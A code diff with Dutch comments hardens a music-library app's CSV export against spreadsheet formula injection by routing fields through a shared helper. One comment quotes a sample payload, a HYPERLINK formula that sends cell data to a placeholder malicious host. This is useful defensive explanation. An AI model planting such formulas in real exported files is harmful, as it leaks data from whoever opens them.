@@ -12,6 +12,7 @@ import { authenticateToken, AuthRequest } from '../middleware/auth';
 import { asyncHandler, ApiError } from '../middleware/errorHandler';
 import db from '../database/connection';
 import { bijlageKopregel } from '../utils/contentDisposition';
+import { csvBestand } from '../utils/csv';
 
 const router = Router();
 
@@ -483,22 +484,33 @@ router.get(
       movement_title: string | null;
     }>;
 
-    // Build CSV
-    const headers = ['ID', 'Titel', 'Componist', 'Arrangeur', 'Duur (sec)', 'Graad', 'Werk nummer', 'Deel'];
-    const rows = titles.map((t) => [
+    // De velden gaan door csvVeld in plaats van door het eigen escapeCsvField
+    // dat hieronder stond. Dat hulpje quootte netjes volgens RFC 4180, maar
+    // kende het tweede probleem niet: een titel als
+    // `=HYPERLINK("http://kwaad/"&A1,"klik")` wordt door Excel, LibreOffice en
+    // Google Sheets uitgevoerd zodra de ontvanger het bestand opent - en die
+    // ziet alleen een linkje. Aanhalingstekens helpen daar niet tegen: die
+    // worden bij het inlezen weggehaald voordat de cel geëvalueerd wordt.
+    //
+    // De lege-tekenreeksen (`|| ''`) zijn weg omdat csvVeld null en undefined
+    // zelf al als leeg veld teruggeeft, en duration_seconds mag als getal mee:
+    // dan blijft het bij komma-scheiding een gewoon getal en wordt een negatieve
+    // waarde niet als formule aangezien.
+    const kopregel = ['ID', 'Titel', 'Componist', 'Arrangeur', 'Duur (sec)', 'Graad', 'Werk nummer', 'Deel'];
+    const rijen = titles.map((t) => [
       t.id,
-      escapeCsvField(t.title),
-      escapeCsvField(t.composer || ''),
-      escapeCsvField(t.arranger || ''),
-      t.duration_seconds?.toString() || '',
+      t.title,
+      t.composer,
+      t.arranger,
+      t.duration_seconds,
       // grade en work_number zijn vrije tekstvelden; een komma erin schoof
       // alle volgende kolommen op. De buurvelden werden wel ontsnapt.
-      escapeCsvField(t.grade || ''),
-      escapeCsvField(t.work_number || ''),
-      escapeCsvField(t.movement_title || ''),
+      t.grade,
+      t.work_number,
+      t.movement_title,
     ]);
 
-    const csv = [headers.join(','), ...rows.map((r) => r.join(','))].join('\n');
+    const csv = csvBestand(kopregel, rijen);
 
     // De orkestnaam werd hier kaalgeslagen met `[^a-zA-Z0-9]` omdat een
     // niet-ASCII teken de met de hand samengestelde kopregel onbruikbaar
@@ -515,12 +527,5 @@ router.get(
     res.send('﻿' + csv); // BOM for Excel compatibility
   }),
 );
-
-function escapeCsvField(value: string): string {
-  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
-    return `"${value.replace(/"/g, '""')}"`;
-  }
-  return value;
-}
 
 export default router;
